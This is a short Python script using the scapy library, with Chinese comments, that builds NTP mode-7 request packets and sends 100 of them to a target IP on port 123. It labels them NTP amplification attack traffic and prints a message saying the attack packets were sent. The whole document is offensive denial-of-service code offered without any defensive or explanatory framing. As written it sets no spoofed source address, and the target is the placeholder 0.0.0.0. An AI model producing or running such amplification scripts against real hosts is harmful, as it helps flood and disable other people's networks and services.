from scapy.all import *

# 定义目标IP地址和端口号
target_ip = "0.0.0.0"
target_port = 123

# 构造NTP请求包
packet = IP(dst=target_ip)/UDP(dport=target_port)/NTP(version=2, mode=7, stratum=0, poll=4, precision=1)

# 发送NTP请求包
send(packet*100)  # 发送100个包作为攻击流量

print("NTP Amplification攻击包已发送至目标IP地址：", target_ip)
